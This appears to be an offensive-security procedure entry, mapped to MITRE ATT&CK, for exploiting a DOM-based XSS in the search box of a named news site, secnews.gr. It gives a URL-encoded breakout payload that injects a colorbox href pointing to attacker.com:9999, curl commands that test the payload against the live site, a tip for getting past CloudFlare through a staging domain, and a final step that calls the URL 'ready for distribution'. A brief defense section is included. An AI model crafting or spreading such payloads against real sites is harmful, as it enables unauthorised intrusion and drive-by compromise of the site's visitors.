---
tags:
  - xss
  - dom-xss
  - injection
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/Verify-DOM-based-XSS-Injection-with-Curl]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Drive-by Compromise]]'
updated_at: '2025-12-14T17:28:20.335Z'
sub_techniques: []
id: ce9c174c-5420-4bdc-a960-054a1f995960
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Drive-by Compromise]]'
---
# Craft-Malicious-Search-URL-for-XSS-Injection

## Summary

This procedure crafts a malicious search URL exploiting the DOM-based XSS in SecNews's search functionality, where the 's' parameter is inserted into a data-currentquery attribute without proper escaping, allowing a single-quote breakout to inject arbitrary HTML attributes like class and href.

## Description

The SecNews site (WordPress-based) reflects the search query 's' directly into HTML without encoding, specifically in <div id="content" data-currentquery='{"s":"query"}'>. By using a payload like %27%20class%3Dcolorbox%20href=/attacker.com:9999%3E, the single quote escapes the attribute, injecting a colorbox class and href that loads external content when clicked. This was tested on https://www.secnews.gr/?s= and bypasses CloudFlare by targeting the staging domain secnews.wpengine.com if needed. The outcome enables the next stages of payload delivery and execution.

## Requirements

1. Public access to the target site (https://www.secnews.gr)
2. Knowledge of URL encoding for payloads
3. Basic web development understanding (HTML attributes, JavaScript plugins)

## Defense

Defensive measures and detection strategies:

- Implement proper HTML encoding for user input in attributes (e.g., use htmlspecialchars in PHP)
- Enable Content Security Policy (CSP) to block inline scripts and external loads
- Monitor for anomalous search queries with encoded quotes or tags via WAF rules

## Objectives

1. Inject malicious attributes into the DOM via search parameter
2. Set up trigger for colorbox plugin to load external content
3. Prepare for JavaScript execution upon user interaction

## Instructions

### Step 1: Verify Injection Point

**Context**: Test the vulnerability to confirm breakout is possible before crafting the full payload.

**Command** ([[commands/Verify-DOM-based-XSS-Injection-with-Curl]]):
```bash
curl -s 'https://www.secnews.gr?s=%27%3E%3Ctest%3E%3C' | egrep -o ".{47}?<test>.*?>"
```

> This fetches the page silently and extracts the injected <test> tag, showing breakout from data-currentquery. Expected output: <div id="content" data-currentquery='{"s":"\\'\'><test><"}' class="main-content articles list sidebar-right non-full">

### Step 2: Craft and Test Malicious URL

**Context**: Build the payload to inject colorbox attributes and validate it loads without errors.

**Command** ([[commands/Verify-DOM-based-XSS-Injection-with-Curl]]):
```bash
curl -s 'https://www.secnews.gr/?s=%27%20class%3Dcolorbox%20href=/attacker.com:9999%3E' | grep -i colorbox
```

> Inspects for the injected class and href. Success confirms the URL is ready for distribution.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Drive-by Compromise]]

### Sub-Techniques


## Commands Used

- [[commands/Verify-DOM-based-XSS-Injection-with-Curl]]

## Tools Used


## Tags

- xss
- injection
- web-exploit
